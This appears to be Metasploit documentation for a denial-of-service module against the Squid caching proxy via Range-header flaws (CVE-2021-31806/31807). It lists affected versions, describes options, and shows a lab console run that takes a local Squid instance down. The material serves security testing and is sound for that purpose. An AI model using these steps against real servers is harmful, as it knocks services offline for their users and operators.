## Vulnerable Application

This module exploits two vulnerabilities in the Squid Caching Proxy server and its
handling of cached pages and the `Range` HTTP header.

Due to the way Squid handles the HTTP request header `Range`, an assertion can be
caused due to a standard HTTP request. Once all of Squid's children workers have
asserted, a Denial of Service of the proxy is achieved.

Vulnerable versions of Squid include:
* 2.5.STABLE2-2.7.STABLE9.
* 3.0-4.1.4.
* 5.0.1-5.0.5.

Security bulletin from Squid: https://github.com/squid-cache/squid/security/advisories/GHSA-pxwq-f3qr-w2xf

## Verification Steps

1. Start msfconsole
2. use auxiliary/dos/http/squid_range_dos.rb`
3. Set `rhost
4. Set `rport`
5. run

## Options

### REQUEST_COUNT

REQUEST_COUNT is both the number of HTTP requests which are sent to the server in
order to perform the actual Denial of Service (i.e. accepted requests by the server),
and the number of requests that are sent to confirm that the Squid host is actually
dead.

### CVE

This is the CVE that will be used to exploit the vulnerability.
The default setting is `CVE-2021-31806`, but `CVE-2021-31807` can also be chosen.

## Scenarios

In this scenario the target server is running on the same host as Metasploit (192.168.159.128).
```
msf6 > use auxiliary/dos/http/squid_range_dos i
msf6 auxiliary(dos/http/squid_range_dos) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 auxiliary(dos/http/squid_range_dos) > set SRVHOST 192.168.159.128
SRVHOST => 192.168.159.128
msf6 auxiliary(dos/http/squid_range_dos) > show options

Module options (auxiliary/dos/http/squid_range_dos):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CVE            CVE-2021-31806   yes       CVE to check/exploit (Accepted: CVE-2021-31806, CVE-2021-31807)
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   REQUEST_COUNT  50               yes       The number of requests to be sent, as well as the number of re-tries to confirm a dead host
   RHOSTS         192.168.159.128  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          3128             yes       The target port (TCP)
   SRVHOST        192.168.159.128  yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT        8080             yes       The local port to listen on.
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                         no        The URI to use for this exploit (default is random)
   VHOST                           no        HTTP server virtual host


Auxiliary action:

   Name  Description
   ----  -----------
   DOS   Perform Denial of Service Against The Target


msf6 auxiliary(dos/http/squid_range_dos) > run
[*] Running module against 192.168.159.128

[*] Sending 50 DoS requests to 192.168.159.128:3128
[*] Using URL: http://192.168.159.128:8080/Sv2fFH3gmGeN4VC
[*] Sent first request to 192.168.159.128:3128
[*] Sent DoS request 1 to 192.168.159.128:3128
[*] Sent DoS request 2 to 192.168.159.128:3128
[*] Sent DoS request 3 to 192.168.159.128:3128
[*] Sent DoS request 4 to 192.168.159.128:3128
[*] Sent DoS request 5 to 192.168.159.128:3128
[+] DoS completely successful.
[*] Server stopped.
[*] Auxiliary module execution completed
msf6 auxiliary(dos/http/squid_range_dos) >
```

At this point, the target Squid server should be completely inaccessible: all children
workers should have exited, and the main process should have also shut down.
